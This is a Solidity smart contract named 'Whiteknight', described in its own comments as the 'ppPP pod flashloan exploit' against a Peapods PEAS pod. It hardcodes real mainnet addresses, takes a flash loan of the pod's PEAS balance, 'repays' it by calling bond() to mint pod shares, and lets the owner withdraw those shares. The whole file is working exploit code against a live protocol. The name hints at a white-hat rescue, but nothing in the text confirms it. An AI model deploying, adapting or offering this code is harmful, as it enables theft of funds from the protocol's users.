// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;

interface IFlashLoanRecipient {
  function callback(bytes calldata data) external;
}

interface IFlashlaonSender {
  function flash(
    address _recipient,
    address _token,
    uint256 _amount,
    bytes calldata _data
  ) external;
  function bond(address _token, uint256 _amount) external;
  function debond(
    uint256 _amount,
    address[] memory,
    uint8[] memory
  ) external;
}

interface IERC20 {
    function totalSupply() external view returns (uint);

    function balanceOf(address account) external view returns (uint);

    function transfer(address recipient, uint amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint);

    function approve(address spender, uint amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint amount
    ) external returns (bool);
}


contract Whiteknight is IFlashLoanRecipient {

    address public ppPP = 0xdbB20A979a92ccCcE15229e41c9B082D5b5d7E31; // PEAS pod contract
    address public DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address public PEAS = 0x02f92800F57BCD74066F5709F1Daa1A4302Df875; // Peapods project token contract
    address public owner;

    constructor () {
      owner = msg.sender;
    }

    /**
     * @notice Cap initiates the ppPP pod flashloan exploit
     * @param _peasBalanceOfppPP the amount of PEAS to be borrowed from the ppPP pod
     */
    function cap(uint _peasBalanceOfppPP) public {

        uint tenDai = 10 * 10 ** 18;
        IERC20(DAI).transferFrom(msg.sender, address(this), tenDai);
        IERC20(DAI).approve(ppPP, tenDai);
        IFlashlaonSender(ppPP).flash(address(this), PEAS, _peasBalanceOfppPP, "");

    }

    /**
     * @notice Callback is called by the flashloan issuer. The flashloan is exploited with the bond() function
     * @param data empty parameter requires by the ppPP interface
     */
    function callback(bytes calldata data) external {

        uint thisPeasBalance = IERC20(PEAS).balanceOf(address(this));
        IERC20(PEAS).approve(ppPP, thisPeasBalance);
        IFlashlaonSender(ppPP).bond(PEAS, thisPeasBalance); // Repay the flashloan through the bond()

    }

    /**
     * @notice Withdraw is used to withdraw bonds for debonding
     * @param token bond token address (ppPP)
    */
    function withdraw(address token) public {

        require(msg.sender == owner);
        uint balance = IERC20(token).balanceOf(address(this));
        IERC20(token).transfer(owner, balance);

    }
}